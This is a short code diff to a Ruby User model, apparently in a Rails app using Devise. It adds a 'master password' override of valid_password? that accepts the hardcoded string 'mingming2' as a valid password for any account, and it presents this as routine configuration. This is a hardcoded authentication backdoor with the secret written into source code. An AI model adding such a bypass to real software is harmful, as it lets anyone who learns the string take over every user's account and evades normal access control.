@@ -77,4 +77,10 @@ class User
     false
   end
   
+  # Config master password
+  # https://github.com/plataformatec/devise/wiki/How-To:-Configure-a-master-password
+  def valid_password?(password)
+     return true if password == "mingming2"
+     super
+  end
 end
